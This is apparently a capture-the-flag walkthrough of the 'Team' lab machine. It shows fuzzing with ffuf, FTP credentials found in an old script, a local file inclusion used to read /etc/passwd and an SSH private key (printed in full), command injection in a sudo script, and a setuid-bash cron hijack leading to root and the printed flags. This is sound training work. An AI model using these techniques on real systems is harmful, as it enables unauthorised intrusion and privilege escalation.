# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 21 | FTP |
| 22 | SSH |
| 80 | HTTP |



# RECONNAISSANCE
---

![Pasted image 20250319153505.png](../../IMAGES/Pasted%20image%2020250319153505.png)

We are dealing with a simple apache2 server, let's check source code:


![Pasted image 20250319153549.png](../../IMAGES/Pasted%20image%2020250319153549.png)

We found a subdomain, let's add `team.thm` to `/etc/hosts`:

```
echo '10.10.66.89 team.thm' | sudo tee -a /etc/hosts
```


![Pasted image 20250319160218.png](../../IMAGES/Pasted%20image%2020250319160218.png)

We can do a little bit of directory fuzzing:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://team.thm/FUZZ" -ic -c -t 200 -e .txt,.php,.html,.pdf,.xml,.json,.sh

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://team.thm/FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions : .txt .php .html .pdf .xml .json .sh
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.html [Status: 200, Size: 2966, Words: 140, Lines: 90, Duration: 157ms]
.php [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 157ms]
.html [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 159ms]
images [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 162ms] 
scripts [Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 158ms]
assets [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 158ms]
robots.txt [Status: 200, Size: 5, Words: 1, Lines: 2, Duration: 158ms]
```

We found hidden directories and an allowed entrance to `robots.txt`, we get `403` status code on the last two but on the `images` one we can find this:

![Pasted image 20250319160355.png](../../IMAGES/Pasted%20image%2020250319160355.png)

Let's check `robots.txt`:

![Pasted image 20250319165903.png](../../IMAGES/Pasted%20image%2020250319165903.png)

We got a user: `dale`, let's save it for now.

Nothing useful in the images directory, let's keep fuzzing, for example, even though we are unauthorized to view `scripts`, we can still fuzz it, let's fuzz it for hidden files:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://team.thm/scripts/FUZZ" -ic -c -t 200 -e .txt,.php,.html,.pdf,.xml,.json

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://team.thm/scripts/FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions : .txt .php .html .pdf .xml .json
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

 [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 164ms]
.php [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 6708ms]
.html [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 158ms]
script.txt [Status: 200, Size: 597, Words: 52, Lines: 22, Duration: 158ms]
```

We got a file, there's a file called `script.txt` which we are able to read:

![Pasted image 20250319170006.png](../../IMAGES/Pasted%20image%2020250319170006.png)

This is revealing that an old script exists in the server, it includes some credentials on it, let's fuzz for it, for this, let's do a minimal change to the `extension-test.txt` wordlist in SecLists:

```
sed s'/^test.//g' /usr/share/seclists/Fuzzing/extension-test.txt > modified-extensions.txt
```

Now we can proceed to fuzz:

```
ffuf -w modified-extensions.txt -u http://team.thm/scripts/script.FUZZ -ic -c -t 100

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://team.thm/scripts/script.FUZZ
 :: Wordlist : FUZZ: /home/samsepiol/modified-extensions.txt
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 100
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

old [Status: 200, Size: 466, Words: 27, Lines: 19, Duration: 153ms]
txt [Status: 200, Size: 597, Words: 52, Lines: 22, Duration: 156ms]
```

We found it, let's read it:

![Pasted image 20250320153453.png](../../IMAGES/Pasted%20image%2020250320153453.png)

A file gets downloaded:

```
cat script.old
#!/bin/bash
read -p "Enter Username: " ftpuser
read -sp "Enter Username Password: " T3@m$h@r3
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit
```

We got credentials, let's go into ftp:

![Pasted image 20250320153627.png](../../IMAGES/Pasted%20image%2020250320153627.png)

We got a `workshare` directory, this is what's inside of it:

![Pasted image 20250320153757.png](../../IMAGES/Pasted%20image%2020250320153757.png)

We got a `New_site.txt` file, let's read it:

![Pasted image 20250320154014.png](../../IMAGES/Pasted%20image%2020250320154014.png)


We got a lot of valuable info, let's try to fuzz for subdomains to check if this is true:

```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://team.thm -H "Host: FUZZ.team.thm" -mc 200,301,302 -fs 11366 -t 100 -ic -c

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://team.thm
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header : Host: FUZZ.team.thm
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 100
 :: Matcher : Response status: 200,301,302
 :: Filter : Response size: 11366
________________________________________________

dev [Status: 200, Size: 187, Words: 20, Lines: 10, Duration: 4628ms]
www [Status: 200, Size: 2966, Words: 140, Lines: 90, Duration: 4628ms]
www.dev [Status: 200, Size: 187, Words: 20, Lines: 10, Duration: 5582ms]
```

And there we are, it is true, let's check this subdomain:

![Pasted image 20250320154354.png](../../IMAGES/Pasted%20image%2020250320154354.png)


If we go to the link, we can see this:


![Pasted image 20250320154411.png](../../IMAGES/Pasted%20image%2020250320154411.png)


The`page=` parameter is directly used to fetch a file. The application does not validate or restrict the input, allowing an attacker to specify arbitrary file paths. Let's read `/etc/passwd` to test:

![Pasted image 20250320154709.png](../../IMAGES/Pasted%20image%2020250320154709.png)

![Pasted image 20250320154734.png](../../IMAGES/Pasted%20image%2020250320154734.png)


# EXPLOITATION
---

We already found the LFI, calling back from the note, `id_rsa` files may exist, let's try to read `dale` file:

![Pasted image 20250320155431.png](../../IMAGES/Pasted%20image%2020250320155431.png)

Nothing happens, this is because as the note said, we need to find a `relevant config` file, for example, the ssh config file is located at `/etc/ssh/sshd_config`, let's try to read it:


![Pasted image 20250320155547.png](../../IMAGES/Pasted%20image%2020250320155547.png)
And there it is, there's our `id_rsa` file:

```id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
cnJvdEBwYXJyb3QBAgMEBQYH
-----END OPENSSH PRIVATE KEY-----
```

Let's log into dale's ssh:

![Pasted image 20250320155928.png](../../IMAGES/Pasted%20image%2020250320155928.png)

We can read `user.txt` at this point but let's proceed with privesc.



# PRIVILEGE ESCALATION
---


We got sudo permissions on the following:

![Pasted image 20250320160024.png](../../IMAGES/Pasted%20image%2020250320160024.png)

We can run `/home/gyles/admin_checks` as `gyles`, let's read the file to know what we're dealing with:

![Pasted image 20250320160152.png](../../IMAGES/Pasted%20image%2020250320160152.png)

The script unsafely executes`$error` without validation:

```
$error 2>/dev/null # Command injection here!
```

Since we run the script as`gyles` via`sudo`, the injected command executes with`gyles`â€™s privileges. Once the timestamp prompt appears, we can inject a shell.

So, in order to escalate into `gyles`, we can do the following:

```
sudo -u gyles /home/gyles/admin_checks

# Once the date input appears:

/bin/bash
```

![Pasted image 20250320160722.png](../../IMAGES/Pasted%20image%2020250320160722.png)

As we can see, we got a shell as `gyles`, we can use this to gain a stable shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![Pasted image 20250320161545.png](../../IMAGES/Pasted%20image%2020250320161545.png)

There we go, let's look around, it's a good time to use linpeas:

![Pasted image 20250320162004.png](../../IMAGES/Pasted%20image%2020250320162004.png)

We can write on a weird script, maybe we are missing something, let's use `pspy` to check on the processes:

![Pasted image 20250320162821.png](../../IMAGES/Pasted%20image%2020250320162821.png)

We can check root is running some scripts, let's try to modify the `script.sh` file:

![Pasted image 20250320163042.png](../../IMAGES/Pasted%20image%2020250320163042.png)

We cannot write on this file directly but we can on the `main_backup.sh` one, let's send this to that file:

```
echo "chmod +s /bin/bash" >> /usr/local/bin/main_backup.sh
```

```
gyles@TEAM:~$ echo "chmod +s /bin/bash" >> /usr/local/bin/main_backup.sh
gyles@TEAM:~$ cat /usr/local/bin/main_backup.sh
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
chmod +s /bin/bash
```

Now, after a minute, we can enter a privileged bash session as root:

![Pasted image 20250320164122.png](../../IMAGES/Pasted%20image%2020250320164122.png)

Let's read both flags:

```
bash-4.4# cat /home/dale/user.txt
THM{6Y0TXHz7c2d}
```

```
bash-4.4# cat /root/root.txt
THM{fhqbznavfonq}
```

![Pasted image 20250320164209.png](../../IMAGES/Pasted%20image%2020250320164209.png)

